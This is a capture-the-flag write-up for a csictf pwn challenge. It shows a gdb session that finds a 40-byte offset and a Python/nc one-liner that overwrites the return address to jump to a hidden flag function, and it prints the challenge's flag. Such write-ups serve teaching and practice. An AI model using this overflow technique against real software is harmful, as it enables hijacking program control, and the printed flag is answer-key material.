## Pwn Intended 0x3

### Writeup by Trent (teerix)

Category: Pwn

```
Teleportation is not possible, or is it?

nc chall.csivit.com 30013

File Included: pwn-intended-0x3 Binary
```

When viewing the the pwn-intended-0x3 file in objdump, you can see that there is a `flag` function below main function's
memory allocation that is never called, so I assumed that was the function that gives us our flag! I noted the memory location
of the function: `0x4011ce`.

I created a python script of a padding "AAAABBBB...YYYYZZZZ" to use for determining where the seg fault occurs.

Setting a breakpoint at the return call of main, I input the padding and printed the stack pointer at the end of the return,
showing where the area before the segmentation fault was:

```
(gdb) break *0x4011cd
Breakpoint 1 at 0x4011cd
(gdb) run < padding
Starting program: /home/tdelor/Downloads/pwn-intended-0x3 < padding
Welcome to csictf! Time to teleport again.

Breakpoint 1, 0x00000000004011cd in main ()
(gdb) s 1
Single stepping until exit from function main,
which has no line number information.

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011cd in main ()
(gdb) x/s $sp
0x7fffffffdf48: "KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
```


Which ended up being on the Js (40 bytes ahead of the padding start), meaning I needed a filler of 40 bytes to put me
at a place to inject the aforementioned memory address of the flag function into the saved instruction pointer upon the return call. Since this was
a 64-bit binary, I had to pad the memory location with a few bytes of 0s.

This is what I settled on:

`python -c "print 'A'*40 + '\xce\x11\x40\x00\x00\x00'" | nc chall.csivit.com 30013`

Which gave me the message "Well, that was quick. Here's your flag:" followed by the flag.

Flag: csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
